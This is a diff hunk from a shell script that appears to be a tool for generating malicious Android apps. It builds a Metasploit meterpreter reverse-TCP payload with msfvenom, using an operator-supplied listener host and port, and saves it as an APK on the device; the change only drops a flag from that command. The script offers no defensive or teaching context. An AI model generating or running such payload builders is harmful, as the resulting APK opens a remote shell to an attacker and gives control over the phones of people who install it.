@@ -63,7 +63,7 @@ echo
 echo
 echo "${yellow}${bt}Please Wait The App Is Generating...${reset}"
 echo
-msfvenom -a dalvik --platform android -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R -o /storage/emulated/0/$name.apk
+msfvenom -a dalvik --platform android -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /storage/emulated/0/$name.apk
 echo "${pink}${bt}"
 echo " ~ App Generated Successfully"
 echo " ~ App Saved To /storage/emulated/0/$name"
